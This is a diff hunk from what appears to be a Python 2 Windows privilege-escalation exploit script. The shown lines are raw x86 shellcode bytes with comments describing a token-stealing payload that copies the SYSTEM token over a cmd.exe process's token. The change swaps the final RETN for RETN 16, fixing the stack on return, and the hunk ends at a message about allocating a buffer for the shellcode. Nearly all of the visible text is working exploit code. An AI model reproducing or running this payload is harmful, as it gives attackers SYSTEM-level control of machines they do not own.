@@ -118,7 +118,7 @@ def shellcode(pid):
         "\x75\xED"                          # JNZ up                ; If not cmd.exe PID then jump to loop start
         "\x89\xB8\xF8\x00\x00\x00"          # MOV [EAX+0xF8], EDI   ; Copy SYSTEM TOKEN to overwrite cmd.exe TOKEN
         "\x61"                              # POPAD
-        "\xC3")                             # RETN
+        "\xC2\x10\x00")                     # RETN 16
 
     print "[*]Allocating buffer for shellcode[*]"
     lpAddress = None
